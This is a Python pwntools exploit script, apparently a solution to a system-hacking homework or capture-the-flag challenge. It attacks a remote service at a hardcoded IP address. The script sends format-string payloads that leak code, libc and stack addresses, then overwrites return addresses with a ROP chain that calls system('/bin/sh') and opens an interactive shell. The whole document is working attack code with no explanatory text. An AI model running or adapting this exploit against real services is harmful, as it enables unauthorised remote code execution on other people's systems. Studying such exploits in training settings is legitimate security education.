from pwn import *

port = 5000
p = remote("52.79.50.147", port)
libc = ELF('./WHS/system_hacking_hw/problem/libc.so.6',checksec=False)

#leak part start
pay = b'%70$p%71$p%72$p'
p.sendlineafter(b'post?\n',pay)
p.recvuntil(b'post:\n')
code_leak = int(p.recv(14),16)
libc_leak = int(p.recv(14),16)
stack_leak = int(p.recv(14),16)

print('code leak = ',hex(code_leak))
print('libc leak = ',hex(libc_leak))
print('stack leak = ',hex(stack_leak))

main = code_leak - 0xbb
print('main func addr = ',hex(main))
printf = main + 0x2e63
print('printf got addr = ',hex(printf))

libc_base = libc_leak - 0x023d0a
system = libc_base + libc.sym['system']
print('system addr = ',hex(system))

ret_addr = stack_leak - 240
print('ret addr = ',hex(ret_addr))
#leak part end

#ret to main
context.bits = 64
writes = {ret_addr:main}
pay = fmtstr_payload(6,writes)
p.sendlineafter(b'post?\n',pay)

#write pop rdi ; ret gadget to ret addr + 16
rdi = main + 0x116
writes = {ret_addr+16:rdi}
pay = fmtstr_payload(6,writes)
p.sendlineafter(b'post?\n',pay)

#ret to main
writes = {ret_addr+8:main}
pay = fmtstr_payload(6,writes)
p.sendlineafter(b'post?\n',pay)

#write /bin/sh string address to ret addr + 24
binsh = libc_base + 0x196152
writes = {ret_addr+24:binsh}
pay = fmtstr_payload(6,writes)
p.sendlineafter(b'post?\n',pay)

#write system address to ret addr + 32
writes = {ret_addr+32:system}
pay = fmtstr_payload(6,writes)
p.sendlineafter(b'post?\n',pay)

p.interactive()